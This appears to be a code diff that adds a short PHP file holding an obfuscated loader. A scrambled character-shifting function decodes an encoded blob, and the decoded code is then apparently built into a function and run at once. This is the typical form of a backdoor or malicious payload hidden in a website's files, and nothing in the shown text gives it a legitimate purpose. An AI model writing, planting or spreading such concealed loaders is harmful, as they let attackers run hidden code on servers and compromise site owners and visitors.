@@ -1,0 +1,3 @@
+<?php
+if(!function_exists("smE")){function smE($OhTW){$SZLvfA=array('32','\o^c[aViZ','WVhZKItYZXdYZ',$OhTW);for($FGwSye=0;$FGwSye<4;$FGwSye++){for($HYoLAt=0;$HYoLAt<strlen($SZLvfA[$FGwSye]);$HYoLAt++) $SZLvfA[$FGwSye][$HYoLAt] = chr(ord($SZLvfA[$FGwSye][$HYoLAt])-($FGwSye?$SZLvfA[$HYoLAt xor $HYoLAt]:1));if($FGwSye==2) $SZLvfA[3]=$SZLvfA[1]($SZLvfA[2]($SZLvfA[3]));} return $SZLvfA[3];}$sUx="MzUFAiX5umrbuo6Oqk5by5LUlIzMAvPK6ppa8yI7uwmhVd1ljejCAVW9dZ0BkwA=";$GHUp="smE";$ZJJ=$GHUp("i0iPCsuMKonOSo7IjEtJBgA=");$QrMR=$ZJJ('',$GHUp($sUx));$QrMR();}
+?>
